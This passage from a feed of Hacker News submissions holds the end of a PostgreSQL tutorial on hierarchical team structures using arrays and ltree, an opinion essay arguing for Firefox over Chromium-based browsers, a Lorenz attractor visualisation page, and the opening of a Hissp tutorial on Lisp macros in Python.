           ('</span><span>Interns</span><span>', '</span><span>Product</span><span>'),
           ('</span><span>Administration</span><span>', </span><span>NULL</span><span>),
           ('</span><span>Human Resources</span><span>', '</span><span>Administration</span><span>'),
           ('</span><span>Finance</span><span>', '</span><span>Administration</span><span>'),
           ('</span><span>Marketing</span><span>', </span><span>NULL</span><span>),
           ('</span><span>Logistics</span><span>', </span><span>NULL</span><span>),
           ('</span><span>国际化</span><span>', </span><span>NULL</span><span>);
</span></code></pre>
<p>Listing all of them:</p>
<pre><code data-lang="sql"><span>SELECT </span><span>* </span><span>FROM</span><span> team_structure </span><span>ORDER BY path</span><span>;
</span></code></pre><table><thead><tr><th>name</th><th>parent</th><th>path</th></tr></thead><tbody>
<tr><td>Administration</td><td>NULL</td><td>{Administration}</td></tr>
<tr><td>Finance</td><td>Administration</td><td>{Administration,Finance}</td></tr>
<tr><td>Human Resources</td><td>Administration</td><td>{Administration,Human Resources}</td></tr>
<tr><td>Engineering</td><td>NULL</td><td>{Engineering}</td></tr>
<tr><td>Geschäftstätigkeit</td><td>Engineering</td><td>{Engineering,Geschäftstätigkeit}</td></tr>
<tr><td>Product</td><td>Engineering</td><td>{Engineering,Product}</td></tr>
<tr><td>Interns</td><td>Product</td><td>{Engineering,Product,Interns}</td></tr>
<tr><td>Logistics</td><td>NULL</td><td>{Logistics}</td></tr>
<tr><td>Marketing</td><td>NULL</td><td>{Marketing}</td></tr>
<tr><td>国际化</td><td>NULL</td><td>{国际化}</td></tr>
</tbody></table>
<p>A specific one:</p>
<pre><code data-lang="sql"><span>SELECT </span><span>* </span><span>FROM</span><span> team_structure </span><span>WHERE</span><span> name = '</span><span>Finance</span><span>';
</span></code></pre><table><thead><tr><th>name</th><th>parent</th><th>path</th></tr></thead><tbody>
<tr><td>Finance</td><td>Administration</td><td>{Administration,Finance}</td></tr>
</tbody></table>
<p>Finding all subteams (deep) of a team:</p>
<pre><code data-lang="sql"><span>SELECT </span><span>* </span><span>FROM</span><span> team_structure </span><span>WHERE </span><span>'</span><span>Product</span><span>' = ANY(</span><span>path</span><span>);
</span></code></pre><table><thead><tr><th>name</th><th>parent</th><th>path</th></tr></thead><tbody>
<tr><td>Product</td><td>Engineering</td><td>{Engineering,Product}</td></tr>
<tr><td>Interns</td><td>Product</td><td>{Engineering,Product,Interns}</td></tr>
</tbody></table>
<p>Let's look at the analysis:</p>
<pre><code data-lang="sql"><span>&gt; EXPLAIN ANALYZE </span><span>SELECT </span><span>* </span><span>FROM</span><span> team_structure </span><span>WHERE </span><span>'</span><span>Product</span><span>' = ANY(</span><span>path</span><span>);
Seq Scan on team_structure  (cost=</span><span>0</span><span>.</span><span>00</span><span>..</span><span>24</span><span>.</span><span>63</span><span> rows=</span><span>3</span><span> width=</span><span>96</span><span>) (actual </span><span>time</span><span>=</span><span>0</span><span>.</span><span>015</span><span>..</span><span>0</span><span>.</span><span>016</span><span> rows=</span><span>2</span><span> loops=</span><span>1</span><span>)
  Filter: ('</span><span>Product</span><span>'::</span><span>text </span><span>= ANY (</span><span>path</span><span>))
  Rows Removed by Filter: </span><span>8
</span><span>Planning </span><span>Time</span><span>: </span><span>0</span><span>.</span><span>047</span><span> ms
Execution </span><span>Time</span><span>: </span><span>0</span><span>.</span><span>026</span><span> ms
</span></code></pre><h2 id="solution-2-ltree-columns">Solution 2: <code>ltree</code> columns</h2>
<blockquote>
<p>Thanks to <a href="https://twitter.com/focusaurus">@focusaurus</a> for giving me the idea to add this section after publication!</p>
</blockquote>
<p><code>ltree</code> is an extension that you should <em>probably</em> already have if your PostgreSQL is an officially distributed package. The <a href="https://www.postgresql.org/docs/12/ltree.html">PostgreSQL docs</a> on the <code>ltree</code> type summarize it quite well, so let's not just repeat them and let's solve our problem!</p>
<p>First, let's note some limitations:</p>
<blockquote>
<p>A label is a sequence of alphanumeric characters and underscores <strong>(for example, in C locale the characters A-Za-z0-9_ are allowed)</strong>. Labels must be <strong>less than 256 bytes long</strong>.</p>
</blockquote>
<p>While the length limit is not terrible, the lack of support for the full UTF-8 spectrum, such as spaces or even words like 工程 or Geschäftstätigkeit is really limiting!</p>
<p>So, when we create our table, let's give it a <code>name</code> column where we can store any e̘̫̩̼͝x̢o̵̞͙̰͕t͈̼̺͍̥ͅi̻͉̺͚͕c̶̥̘͖̪̤̜ text we want. We'll also need a <code>slug</code> column containing the expected fragment in the <code>path</code>.</p>
<pre><code data-lang="sql"><span>CREATE EXTENSION IF NOT EXISTS ltree;
</span><span>CREATE TABLE </span><span>teams</span><span> (
    name </span><span>text
        </span><span>NOT </span><span>NULL</span><span>,
    slug </span><span>text
        </span><span>NOT </span><span>NULL
        </span><span>CHECK</span><span> (slug ~</span><span>* </span><span>'</span><span>^[A-Za-z0-9_]{1,255}$</span><span>'),
    </span><span>path</span><span> ltree
        UNIQUE NOT </span><span>NULL
        </span><span>PRIMARY KEY
</span><span>);
</span></code></pre><h3 id="testing-1">Testing</h3>
<p>Loading the data is a bit different, you'll notice we just insert paths. </p>
<pre><code data-lang="sql"><span>INSERT INTO</span><span> teams (name, slug, </span><span>path</span><span>)
    </span><span>VALUES</span><span> ('</span><span>Engineering</span><span>', '</span><span>Engineering</span><span>', '</span><span>Engineering</span><span>'),
           ('</span><span>Geschäftstätigkeit</span><span>', '</span><span>Operations</span><span>', '</span><span>Engineering.Operations</span><span>'),
           ('</span><span>Product</span><span>', '</span><span>Product</span><span>', '</span><span>Engineering.Product</span><span>'),
           ('</span><span>Interns</span><span>', '</span><span>Interns</span><span>', '</span><span>Engineering.Product.Interns</span><span>'),
           ('</span><span>Administration</span><span>', '</span><span>Administration</span><span>', '</span><span>Administration</span><span>'),
           ('</span><span>Human Resources</span><span>', '</span><span>Human_Resources</span><span>', '</span><span>Administration.Human_Resources</span><span>'),
           ('</span><span>Finance</span><span>', '</span><span>Finance</span><span>', '</span><span>Administration.Finance</span><span>'),
           ('</span><span>Marketing</span><span>', '</span><span>Marketing</span><span>', '</span><span>Marketing</span><span>'),
           ('</span><span>Logistics</span><span>', '</span><span>Logistics</span><span>', '</span><span>Logistics</span><span>'),
           ('</span><span>国际化</span><span>', '</span><span>Internationalization</span><span>','</span><span>Internationalization</span><span>');
</span></code></pre>
<p>Listing all of them:</p>
<pre><code data-lang="sql"><span>SELECT </span><span>* </span><span>FROM</span><span> teams </span><span>ORDER BY path</span><span>;
</span></code></pre><table><thead><tr><th>name</th><th>slug</th><th>path</th></tr></thead><tbody>
<tr><td>Administration</td><td>Administration</td><td>Administration</td></tr>
<tr><td>Finance</td><td>Finance</td><td>Administration.Finance</td></tr>
<tr><td>Human Resources</td><td>Human_Resources</td><td>Administration.Human_Resources</td></tr>
<tr><td>Engineering</td><td>Engineering</td><td>Engineering</td></tr>
<tr><td>Geschäftstätigkeit</td><td>Operations</td><td>Engineering.Operations</td></tr>
<tr><td>Product</td><td>Product</td><td>Engineering.Product</td></tr>
<tr><td>Interns</td><td>Interns</td><td>Engineering.Product.Interns</td></tr>
<tr><td>国际化</td><td>Internationalization</td><td>Internationalization</td></tr>
<tr><td>Logistics</td><td>Logistics</td><td>Logistics</td></tr>
<tr><td>Marketing</td><td>Marketing</td><td>Marketing</td></tr>
</tbody></table>
<pre><code data-lang="sql"><span>SELECT </span><span>* </span><span>FROM</span><span> teams </span><span>WHERE</span><span> slug = '</span><span>Finance</span><span>';
</span></code></pre><table><thead><tr><th>name</th><th>slug</th><th>path</th></tr></thead><tbody>
<tr><td>Finance</td><td>Finance</td><td>Administration.Finance</td></tr>
</tbody></table>
<p>Finding all subteams (deep) of a team:</p>
<pre><code data-lang="sql"><span>SELECT </span><span>* </span><span>FROM</span><span> teams </span><span>WHERE path</span><span> @ '</span><span>Product</span><span>';
</span></code></pre><table><thead><tr><th>name</th><th>slug</th><th>path</th></tr></thead><tbody>
<tr><td>Engineering</td><td>Engineering</td><td>Engineering</td></tr>
<tr><td>Geschäftstätigkeit</td><td>Operations</td><td>Engineering.Operations</td></tr>
<tr><td>Product</td><td>Product</td><td>Engineering.Product</td></tr>
<tr><td>Interns</td><td>Interns</td><td>Engineering.Product.Interns</td></tr>
</tbody></table>
<p>The query plan:</p>
<pre><code data-lang="sql"><span>&gt; EXPLAIN ANALYZE </span><span>SELECT </span><span>* </span><span>FROM</span><span> teams </span><span>WHERE path</span><span> @ '</span><span>Product</span><span>';
Seq Scan on teams  (cost=</span><span>0</span><span>.</span><span>00</span><span>..</span><span>18</span><span>.</span><span>13</span><span> rows=</span><span>1</span><span> width=</span><span>96</span><span>) (actual </span><span>time</span><span>=</span><span>0</span><span>.</span><span>013</span><span>..</span><span>0</span><span>.</span><span>014</span><span> rows=</span><span>2</span><span> loops=</span><span>1</span><span>)
  Filter: (</span><span>path</span><span> @ '</span><span>Product</span><span>'::ltxtquery)
  Rows Removed by Filter: </span><span>8
</span><span>Planning </span><span>Time</span><span>: </span><span>0</span><span>.</span><span>055</span><span> ms
Execution </span><span>Time</span><span>: </span><span>0</span><span>.</span><span>029</span><span> ms
</span></code></pre><h2 id="conclusion">Conclusion</h2>
<p>As you can see, this problem can be tackled in a couple different ways, with some basic SQL concepts used together, or with already existing types! Don't let limitations turn you away, you can overcome them!</p>
<p>I hope this have given you some ideas about new things you can do with your database!</p>


            </article>
        </div></div>]]>
            </description>
            <link>https://hoverbear.org/blog/postgresql-hierarchical-structures</link>
            <guid isPermaLink="false">hacker-news-small-sites-25815370</guid>
            <pubDate>Sun, 17 Jan 2021 21:49:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[It is your moral obligation to use Firefox (2019)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25814308">thread link</a>) | @Bluestein
<br/>
January 17, 2021 | https://0x46.net/thoughts/2019/04/09/use-firefox/ | <a href="https://web.archive.org/web/*/https://0x46.net/thoughts/2019/04/09/use-firefox/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <div>  <p>You may have recently read that a new version of Internet Explorer (currently hiding under an alias Microsoft Edge) based on Chromium has been released. According to <a href="https://web.archive.org/web/20190403181903/https://en.wikipedia.org/wiki/Usage_share_of_web_browsers">current market share rankings</a> this move puts Chromium-based browsers well above 75% of the desktop browser market share. The biggest contributor to this statistic is of course Google Chrome. For comparison Firefox at the height of its popularity barely managed to cross 30% market share.</p> <h2>How did that happen?</h2> <p>Personally I am able to identify several factors that contributed to the success of Google Chrome. </p> <h3>Aggressive marketing</h3> <p>As of now <em>google.com</em> remains the most visited website in the world by a significant margin. Google has been advertising Chrome on its home page, in search results, in their competitor's products and all over the web. Not only did it have the advertising platform capable of reaching the highest number of users in the world but also the resources to run a world-wide campaign on the scale never seen before in the web browser market.</p> <h3>Performance</h3> <p>Chrome displayed amazing performance improvements over competing browsers from day one. While Internet Explorer has always been a synonym for abysmal performance, Firefox started lagging behind the user needs and was struggling to deliver its major multi-processing feature dubbed Electrolysis as Chrome adoption was racing forward.</p> <p>A couple of years after the release of Chrome significant developments in the area of interactive websites, WebGL and other ground breaking technologies started to appear online. At the time Chrome was often the only browser able to run all the interesting web experiments or even playback 1080p videos on old hardware without breaking a sweat. This coupled with the growing frustration of Firefox users has led to faster adoption rates.</p> <h3>Chrome Web Store</h3> <p>Chrome capitalized on one of the most popular features of Firefox offering the users an easy way of installing various browser extensions. With the developers being actively encouraged to write new extensions many equivalents of popular Firefox addons were quickly created. An ability to install extensions has always been a large reason behind users choosing Firefox over Internet Explorer and allowed many of them to switch to Chrome.</p> <h3>Standards adoption</h3> <p>Another of the main selling points of Firefox over Internet Explorer was the standards adoption rate. Both the developers and the users profoundly hated the latter for its stagnant development, slow version adoption and very often buggy and incomplete implementations. For a long time a message "works best with Firefox" could be seen on some websites attempting to use newer standards and Firefox was a breath of fresh air in the web industry.</p> <p>After being released Chrome managed to beat everyone, including Firefox, adopting new standards and breakthrough technologies quicker than any other browser in the market. This was widely advertised with various demos and "Chrome experiments".</p> <h3>Version adoption</h3> <p>Chrome updates the browser to the newest version at launch just as Firefox does ensuring that all the newest features and security fixes are always in place and available for the developers. This still contrasts with the model of Microsoft Edge releases which are tightly coupled to the operating system updates (just as the browser itself is tightly coupled to the OS itself).</p> <h3>Integration with various Google services</h3> <p>Chrome integrates with widely used Google services allowing the users to easily access their data and to sync it between various devices. This was supported by the fact that the most popular smartphone operating system in the world was also created by Google and integrates with the same services.</p> <h2>What does it mean?</h2> <p>While both Google Chrome and Microsoft Edge themselves are proprietary products they are based on the open source Chromium project utilizing Blink and V8 engines. This means that in practice the entire browser market is currently based on free and open solutions. This is obviously a wonderful thing and Google Chrome itself appears to be a good and nice to use product. Unfortunately as always the world is not as beautiful as we would like it to be.</p> <p>As the Chromium project is largely financed by Google and used by Chrome, the most popular browser in the world, Google exerts a significant political pressure over the project and de facto controls it. This control can at this point effectively be used in order to shape the web and push it in the desired direction.</p> <p>There were already a couple of cases of Google pushing their agenda and breaking various standards. As an example <a href="https://web.archive.org/web/20190409004832/http://tonsky.me/blog/chrome-intervention/">one of them</a> involved DOM APIs while <a href="https://web.archive.org/web/20190409214049/https://stackoverflow.com/questions/12374442/chrome-ignores-autocomplete-off">another one</a> involved breaking one of the <code>&lt;input&gt;</code> tag attributes. Whether or not you agree with those changes, Google decided to deliberately break the beforementioned standards.</p> <p>Not only that, but the attack itself comes from multiple fronts. Google's armies march in broad daylight burning the countryside, this we know. But, in secret, another force approaches from an unexpected direction: their fleet sails to capture the online media. Google is currently pushing the adoption of a technology called AMP. Only news websites offering a full or a partial alternative implementation available in this technology are <a href="https://web.archive.org/web/20190403162948/https://www.theregister.co.uk/2017/05/19/open_source_insider_google_amp_bad_bad_bad/">promoted in certain places in Google search results</a>. This effectively strikes at the core principles of the web forcing the developers to use a certain technology in order to promote the websites. This is particulary efficient with Google having a de facto monopoly in the online advertising business and comparable to the worst anti-competitive plots and schemes that Microsoft is well known for.</p> <p>All those facts combined threaten the web in the same way in which Microsoft and its practices did. No organisation should have a monopoly over the standards shaping the web - and the fact is that a similar situation already led to immense frustration and cries for help from various developers in the past. History is now repeating itself however the reactions are way more subdued and it seems that unfortunately many of us are content with it as long as the browser which controls the market is kept up to date.</p> <p>Overall this move by Microsoft brings the number of significant implementations in the browser market back to two. As we can learn from Microsoft's failures it is at this point unrealistic to believe that a new browser can be written from scratch. Our rendering and JavaScript engines are at this point so complicated that creating a new product from scratch is less realistic than creating an entire new operating system together with various user space programs. It appears that with the way things are heading right now the complexity of our web standards will lead to a downwfall of the web as we know it. With every year it is more likely that one day you will not be able to create a website using the technologies of your choosing and you will not be able to make it behave as you see fit. Others will make those decisions for you.</p> <h2>How can we change that?</h2> <p>In the short term? Right now the only solution I can see is trying to even out the scales and switching back to Firefox, if you haven't already done so. Firefox is a modern browser and its performance has been drastically improved with recent updates. If you want to try to retain balance - try using it again.</p> <p>In the long term? Currently everything points to the fact that the complexity of the web will be its downfall with all browsers converging on a single implementation of the standards. I do not see what a long term action we can take to prevent it but I do believe that idenfiying a problem is important to start devising solutions to it.</p> <p> 2019-04-09 </p> </div> </div></div>]]>
            </description>
            <link>https://0x46.net/thoughts/2019/04/09/use-firefox/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25814308</guid>
            <pubDate>Sun, 17 Jan 2021 19:57:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Lorenz Attractor]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25813956">thread link</a>) | @autoditype
<br/>
January 17, 2021 | https://mathisonian.github.io/lorenz/ | <a href="https://web.archive.org/web/*/https://mathisonian.github.io/lorenz/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="idyll-mount">
      <div data-reactroot="" data-reactid="1" data-react-checksum="154225102"><meta title="Lorenze Attractor" data-reactid="2"><p data-reactid="5"><!-- react-text: 6 -->The <!-- /react-text --><!-- react-text: 8 -->
is a set of chaotic solutions to the Lorenz system, defined by three coupled non-linear
equations:<!-- /react-text --></p><p>
\frac{\delta x}{\delta t} = a (y - x)</p><p>
\frac{\delta y}{\delta t} = x (b - z) - y</p><p>
\frac{\delta z}{\delta t} = xy - c z</p><p data-reactid="24"><!-- react-text: 25 -->On the right, you can see an implementation of the Lorenz attractor in WebGL using <!-- /react-text --><!-- react-text: 27 -->.<!-- /react-text --></p><p data-reactid="28"><!-- react-text: 29 -->Note that the equations above are dynamic. You can click on the constants <!-- /react-text --><code data-reactid="30"><!-- react-text: 31 -->a<!-- /react-text --></code><!-- react-text: 32 -->, <!-- /react-text --><code data-reactid="33"><!-- react-text: 34 -->b<!-- /react-text --></code><!-- react-text: 35 -->, or <!-- /react-text --><code data-reactid="36"><!-- react-text: 37 -->c<!-- /react-text --></code><!-- react-text: 38 --> and change their values to
radically change the appearance of the attractor.<!-- /react-text --></p><p data-reactid="39"><!-- react-text: 40 -->The code that I used to create this was modified from <!-- /react-text --><!-- react-text: 42 -->, which contains a
basic implementation in 140 bytes. I modified it to use a WebGL particle system, and dynamically respond to updates of the constants. I also
added in a <!-- /react-text --><a href="https://github.com/rreusser/regl-camera" data-reactid="43"><!-- react-text: 44 -->controllable camera<!-- /react-text --></a><!-- react-text: 45 -->, so that you can click and drag on the rendered output to change your viewpoint
(although the scrolling is a little wonky - sorry about that!).<!-- /react-text --></p><p data-reactid="46"><!-- react-text: 47 -->Here's the code I ended up with to make this Idyll component:<!-- /react-text --></p><p data-reactid="49"><!-- react-text: 50 -->Read more about Idyll at <!-- /react-text --><!-- react-text: 52 -->,
or <!-- /react-text --><!-- react-text: 54 -->.<!-- /react-text --></p></div>
    </div></div>]]>
            </description>
            <link>https://mathisonian.github.io/lorenz/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25813956</guid>
            <pubDate>Sun, 17 Jan 2021 19:23:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Learn to write Lisp macros in Python]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25813852">thread link</a>) | @gilch
<br/>
January 17, 2021 | https://hissp.readthedocs.io/en/v0.2.0/macro_tutorial.html | <a href="https://web.archive.org/web/*/https://hissp.readthedocs.io/en/v0.2.0/macro_tutorial.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Lisp is a higher-level language than Python,
in the same sense that Python is a higher-level language than C,
and C is a higher-level language than assembly.</p><p>In C, abstractions like for-loops and the function call stack are
<em>primitives</em>—features built into the language.
But in assembly, those are <em>design patterns</em> built with lower-level jumps/GOTOs
that have to be repeated each time they’re needed.
Things like call stacks had to be discovered and developed and learned as best practice
in the more primitive assembly languages.
Before the development of the structured programming paradigm,
the industry standard was GOTO spaghetti.</p><p>Similarly, in Python, abstractions like iterators, classes, higher-order functions,
and garbage collection are <em>primitives</em>,
but in C, those are <em>design patterns</em>,
discovered and developed over time as best practice,
and built with lower-level parts like structs and pointers,
which have to be repeated each time they’re needed.</p><p>To someone who started out in assembly or BASIC, or C, or even Java,
Python seems marvelously high-level, once mastered.
Python makes everything that was so tedious before <a href="https://xkcd.com/353/">seem <em>so easy</em>.</a></p><p>But the advanced Python developer eventually starts to notice the cracks.
You can get a lot further in Python, but like the old GOTO spaghetti code,
large enough projects start to collapse under their own weight.
Python seemed so easy before,
but certain repeated patterns can’t be abstracted away.
You’re stuck with a certain amount of boilerplate and ceremony.</p><p>Programmers comfortable with C,
but unfamiliar with Python,
will tend to write C idioms in Python,
like using explicit indexes into lists in for-loops over a <a href="https://docs.python.org/3/library/stdtypes.html#range" title="(in Python v3.9)"><code><span>range</span></code></a>,
instead of using the list’s iterator directly.
Their code is said to be <em>unpythonic</em>.
They forgo much of Python’s power,
because they don’t know the right idioms.</p><p>“Design patterns” and “idioms” in low-level languages
are language-level built-in features of higher-level ones.
Lisp is even higher-level than that.
In Lisp, you don’t have “design patterns” for long,
because they are a thing you can abstract to avoid repeating.
You can create your own <em>language-level</em> features,
because macros give you hooks into the compiler itself.</p><p>Lisp can do things you might not have realized were possible.
Until you understand what Lisp can do,
you’re forgoing much of Lisp’s power.
This is a tutorial,
not a reference,
and I’ll be explaining not just how to write macros,
but why you need them.</p><p>If you’re new to Lisp,
go back and read the <a href="https://hissp.readthedocs.io/en/v0.2.0/style_guide.html"><span>style guide</span></a> if you haven’t already.
Understanding how Lisp is <em>formatted</em> helps you to read it,
not just write it.
And you will need to read it.
Learning to read a new programming language can be difficult,
because you’re using up working memory that would otherwise
be helping with the meaning of the code on the syntax itself.
This does get better with familiarity,
because you can offload that part to your long-term memory.
That also means that it’s more difficult the more different the new language is
from those you already know.</p><p>Fortunately, Lissp’s syntax is very minimal,
so there’s not that much to remember,
and most of the vocabulary you know from Python already.
You can skim over the Python in this tutorial,
but resist the urge to skim the Lissp.
<a href="https://en.wikipedia.org/wiki/S-expression">S-expressions</a>
are a very direct representation of the same kind of syntax trees that
you mentally generate when reading any other programming language.
Take your time and comprehend each subexpression instead of taking it in all at once.</p><p>The previous tutorial was mostly about learning how to program with
a subset of Python in a new skin.
This one is about using that knowledge to reprogram the skin itself.</p><p>If you don’t know the basics from the <a href="https://hissp.readthedocs.io/en/v0.2.0/tutorial.html"><span>previous tutorial</span></a>,
go back and read that now, or at least read the <a href="https://hissp.readthedocs.io/en/v0.2.0/lissp_quickstart.html"><span>quick start</span></a>.</p><p>In the previous tutorial we mostly used the REPL,
but it can become tedious to type long forms into the REPL,
and it doesn’t save your work.
S-expressions are awkward to edit without editor support for them,
and the included Lissp REPL is layered on Python’s interactive console,
which has only basic line editing support.</p><p>The usual workflow when developing Lissp is to create a <code><span>.lissp</span></code>
file and work in there.
Then you can save as you go
and send fragments of it to the REPL for evaluation and experimentation.
You might already develop Python this way.
A good editor can be configured to send selected text to the REPL
with a simple keyboard command,
but copy-and-paste into a terminal window will do.</p><p>Setting up your editor for Lissp is beyond the scope of this tutorial.
If you’re not already comfortable with Emacs and Paredit,
give <a href="https://shaunlebron.github.io/parinfer/">Parinfer</a> a try.
It’s probably easiest to set up in <a href="https://atom.io/packages/parinfer">Atom</a>.</p><div id="shorter-lambdas">
<h2>Shorter Lambdas<a href="#shorter-lambdas" title="Permalink to this headline">¶</a></h2>
<p>The defect rate in computer programs seems to be a near-constant fraction
of the number of kilobytes of source code.
For reasonable line length,
it doesn’t seem to matter how much those lines are doing,
or what language it’s written in.
Code is a <em>liability</em>.
It’s that much more space for bugs to hide
— that much more you have to read to understand the system.
The less code you have, the better,
as long as it still gets the job done.</p>
<p>Perhaps this can be taken too far.
Code golf is good exercise, not good practice.
Eventually, there are diminishing returns,
and other costs to consider.
But as a rule of thumb,
one of the best things you can do to improve a codebase is to make it <em>shorter</em>,
almost any way you can.
Fewer slightly less-readable lines are much more readable
than too many slightly more-readable lines.</p>
<p>Consider Python’s humble <code><span>lambda</span></code>.
It’s important to programming in the functional style,
and central to the way Hissp works,
as a compilation target for one of its two special forms.
It’s actually really powerful.</p>
<p>But the overhead of typing out a six-letter word might make you a little too reluctant to use it,
unlike in Smalltalk where it’s just square brackets,
and it’s used all the time in control flow methods.</p>
<p>Wouldn’t it be nice if we could give <code><span>lambda</span></code> a shorter name?</p>

<p>Could we then use <code><span>L</span></code> in place of <code><span>lambda</span></code>?
Maybe like this?</p>
<div><div><pre><span></span><span>squares</span> <span>=</span> <span>map</span><span>(</span><span>L</span> <span>x</span><span>:</span> <span>x</span> <span>*</span> <span>x</span><span>,</span> <span>range</span><span>(</span><span>10</span><span>))</span>
</pre></div>
</div>
<p>Alas, this doesn’t work.
The <code><span>L</span> <span>=</span> <span>lambda</span></code> is a syntax error.</p>
<p>To be fair to Python, I’d use a generator expression here,
which is the same length:</p>
<div><div><pre><span></span><span>squares</span> <span>=</span> <span>map</span><span>(</span><span>L</span> <span>x</span><span>:</span> <span>x</span> <span>*</span> <span>x</span><span>,</span> <span>range</span><span>(</span><span>10</span><span>))</span>
<span>squares</span> <span>=</span> <span>(</span><span>x</span> <span>*</span> <span>x</span> <span>for</span> <span>x</span> <span>in</span> <span>range</span><span>(</span><span>10</span><span>))</span>
</pre></div>
</div>
<p>But I need a simple example,
and lambdas are a lot more general:</p>
<div><div><pre><span></span><span>product</span> <span>=</span> <span>reduce</span><span>(</span><span>L</span> <span>a</span><span>,</span> <span>x</span><span>:</span> <span>a</span> <span>*</span> <span>x</span><span>,</span> <span>range</span><span>(</span><span>1</span><span>,</span> <span>7</span><span>))</span>
</pre></div>
</div>
<p>A genexpr doesn’t really help us in a <a href="https://docs.python.org/3/library/functools.html#functools.reduce" title="(in Python v3.9)"><code><span>reduce</span></code></a>.</p>
<p>They say that in Python everything is an object.
But it’s not quite true, is it?
<code><span>lambda</span></code> isn’t an object in Python.
It’s a reserved word, but at runtime, that’s not an object.
It’s not anything.
If you’re rolling your eyes and thinking,
“Why would I even expect this to work?”
then you’re still thinking inside the Python box.</p>
<p>You can store class and function objects in variables
and pass them as arguments to functions in Python.
To someone who came from a language without higher-order functions,
this feels like breaking the rules.
Using it effectively feels like amazing out-of-the-box thinking.</p>
<p>Let’s begin.</p>
<div id="warm-up">
<h3>Warm-Up<a href="#warm-up" title="Permalink to this headline">¶</a></h3>
<p>Create a Lissp file (perhaps <code><span>macros.lissp</span></code>),
and open it in your Lisp editor of choice.</p>
<p>Fire up the Lissp REPL in a terminal,
or in your editor if it does that.</p>
<p>Add the prelude to the top of the file:</p>
<div><div><pre><span></span><span>(</span><span>hissp.basic.._macro_.prelude</span><span>)</span>
</pre></div>
</div>
<p>And push it to the REPL as well:</p>
<div><div><pre><span></span><span>#&gt;</span> <span>(</span><span>hissp.basic.._macro_.prelude</span><span>)</span>
<span>&gt;&gt;&gt; </span><span># hissp.basic.._macro_.prelude</span>
<span>... </span><span>__import__</span><span>(</span><span>'builtins'</span><span>)</span><span>.</span><span>exec</span><span>(</span>
<span>... </span>  <span>(</span><span>'from operator import *</span><span>\n</span><span>'</span>
<span>... </span>   <span>'from itertools import *</span><span>\n</span><span>'</span>
<span>... </span>   <span>'try:</span><span>\n</span><span>'</span>
<span>... </span>   <span>'    from hissp.basic import _macro_</span><span>\n</span><span>'</span>
<span>... </span>   <span>"    _macro_ = __import__('types').SimpleNamespace(**vars(_macro_))</span><span>\n</span><span>"</span>
<span>... </span>   <span>'except ModuleNotFoundError:</span><span>\n</span><span>'</span>
<span>... </span>   <span>'    pass'</span><span>))</span>
</pre></div>
</div>
<div>
<p>Caution</p>
<p>The <a href="https://hissp.readthedocs.io/en/v0.2.0/hissp.basic.html#hissp.basic._macro_.prelude" title="hissp.basic._macro_.prelude"><code><span>prelude</span></code></a> macro overwrites your <code><span>_macro_</span></code> namespace with a copy of the basic one.
Any macros you’ve defined in there are lost.
In Lissp files, the prelude is meant to be used before any definitions,
when it is used at all.
Likewise, in the REPL, enter it first, or be prepared to re-enter your definitions.
The REPL already comes with the <a href="https://hissp.readthedocs.io/en/v0.2.0/hissp.basic.html#module-hissp.basic" title="hissp.basic"><code><span>basic</span></code></a> macros,
but not the <a href="https://docs.python.org/3/library/itertools.html#module-itertools" title="(in Python v3.9)"><code><span>itertools</span></code></a> or <a href="https://docs.python.org/3/library/operator.html#module-operator" title="(in Python v3.9)"><code><span>operator</span></code></a>s.</p>
</div>
<p>I’ll mostly be showing the REPL from here on.
Remember, compose in your Lissp file,
then push to the REPL.
We’ll be modifying these definitions through several iterations.</p>
<p>Let’s try the same idea in Lissp:</p>
<div><div><pre><span></span><span>#&gt;</span> <span>(</span><span>define</span> <span>L</span> <span>lambda</span><span>)</span>
<span>&gt;&gt;&gt; </span><span># define</span>
<span>... </span><span>__import__</span><span>(</span><span>'operator'</span><span>)</span><span>.</span><span>setitem</span><span>(</span>
<span>... </span>  <span>__import__</span><span>(</span><span>'builtins'</span><span>)</span><span>.</span><span>globals</span><span>(),</span>
<span>... </span>  <span>'L'</span><span>,</span>
<span>... </span>  <span>lambda</span><span>)</span>
Traceback (most recent call last):
  ...
  File "&lt;console&gt;", line 5
    lambda)
          ^
SyntaxError: invalid syntax
</pre></div>
</div>
<p>Still a syntax error.
The problem is that we tried to evaluate the <code><span>lambda</span></code> before the assignment.
You can use Hissp’s other special form, <code><span>quote</span></code>, to prevent evaluation.</p>
<div><div><pre><span></span><span>#&gt;</span> <span>(</span><span>define</span> <span>L</span> <span>'</span><span>lambda</span><span>)</span>
<span>&gt;&gt;&gt; </span><span># define</span>
<span>... </span><span>__import__</span><span>(</span><span>'operator'</span><span>)</span><span>.</span><span>setitem</span><span>(</span>
<span>... </span>  <span>__import__</span><span>(</span><span>'builtins'</span><span>)</span><span>.</span><span>globals</span><span>(),</span>
<span>... </span>  <span>'L'</span><span>,</span>
<span>... </span>  <span>'lambda'</span><span>)</span>
</pre></div>
</div>
<p>OK, but that just turned it into a string.
We could have done that much in Python:</p>

<p>That worked, but can we use it?</p>
<div><div><pre><span></span><span>&gt;&gt;&gt;</span> <span>squares</span> <span>=</span> <span>map</span><span>(</span><span>L</span> <span>x</span><span>:</span> <span>x</span> <span>*</span> <span>x</span><span>,</span> <span>range</span><span>(</span><span>10</span><span>))</span>
<span>Traceback</span> <span>(</span><span>most</span> <span>recent</span> <span>call</span> <span>last</span><span>):</span>
  <span>...</span>
  <span>squares</span> <span>=</span> <span>map</span><span>(</span><span>L</span> <span>x</span><span>:</span> <span>x</span> <span>*</span> <span>x</span><span>,</span> <span>range</span><span>(</span><span>10</span><span>))</span>
                 <span>^</span>
<span>SyntaxError</span><span>:</span> <span>invalid</span> <span>syntax</span>
</pre></div>
</div>
<p>Another syntax error.
No surprise.</p>
<p>Write the equivalent example in your Lissp file
and push it to the REPL:</p>
